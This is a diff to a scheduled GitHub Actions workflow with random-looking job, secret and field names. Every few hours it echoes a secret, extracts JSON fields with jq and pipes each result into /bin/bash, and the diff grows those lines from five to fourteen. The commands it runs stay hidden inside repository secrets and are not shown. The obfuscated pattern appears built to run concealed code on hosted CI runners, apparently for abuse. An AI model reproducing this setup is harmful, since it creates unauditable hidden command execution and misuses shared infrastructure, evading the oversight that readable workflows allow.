@@ -2,9 +2,8 @@ name: zhanxugang9871
 on:
   workflow_dispatch:
   schedule:
-    - cron: '55 1/6 * * *'
-
-jobs:  # 19023
+    - cron: '51 0/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,11 +11,20 @@ jobs:  # 19023
       - uses: actions/checkout@v4
       - name: zhanxugang9871
         env:
-          z6083: ${{ secrets.z6083 }}
+          fnfk11792: ${{ secrets.fnfk11792 }}
         run: |
-          echo $z6083 | jq -r .vevx663 | /bin/bash
-          echo $zb513 | jq -r .ai26734 | /bin/bash
-          echo $zp41368 | jq -r .ri61 | /bin/bash
-          echo $ni32 | jq -r .a91 | /bin/bash
-          echo $sun64646 | jq -r .ovgbd538 | /bin/bash
+          echo $fnfk11792 | jq -r .foy03352 | /bin/bash
+          echo $obhw8 | jq -r .il21 | /bin/bash
+          echo $uhiiy9 | jq -r .fjet3187 | /bin/bash
+          echo $hpv57 | jq -r .jxm0 | /bin/bash
+          echo $rvw74756 | jq -r .asd1773 | /bin/bash
+          echo $gb823 | jq -r .l9352 | /bin/bash
+          echo $zmhzz749 | jq -r .jyty6774 | /bin/bash
+          echo $ck18 | jq -r .znwnh9 | /bin/bash
+          echo $jx4755 | jq -r .pc06 | /bin/bash
+          echo $uwcnf7 | jq -r .abum37 | /bin/bash
+          echo $hpg9 | jq -r .ywga94529 | /bin/bash
+          echo $aa20339 | jq -r .rv1772 | /bin/bash
+          echo $va9842 | jq -r .pedqg1922 | /bin/bash
+          echo $gk60 | jq -r .d316 | /bin/bash
 
